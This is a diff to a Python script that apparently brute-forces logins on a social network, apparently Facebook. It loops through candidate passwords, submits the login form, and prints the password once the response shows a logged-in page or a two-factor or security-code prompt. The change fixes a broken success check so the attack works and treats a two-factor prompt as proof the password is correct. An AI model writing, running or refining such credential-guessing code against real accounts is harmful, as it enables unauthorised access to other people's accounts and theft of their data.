@@ -46,7 +46,8 @@ while file:
 			browser.form['email'] = email
 			browser.form['pass'] = passw
 			response = browser.submit()
-			if 'Find Friends' or 'security code' in response.read():
+			response_data = response.read()
+			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
 				print('Your password is : ',passw)
 				break
 	except:
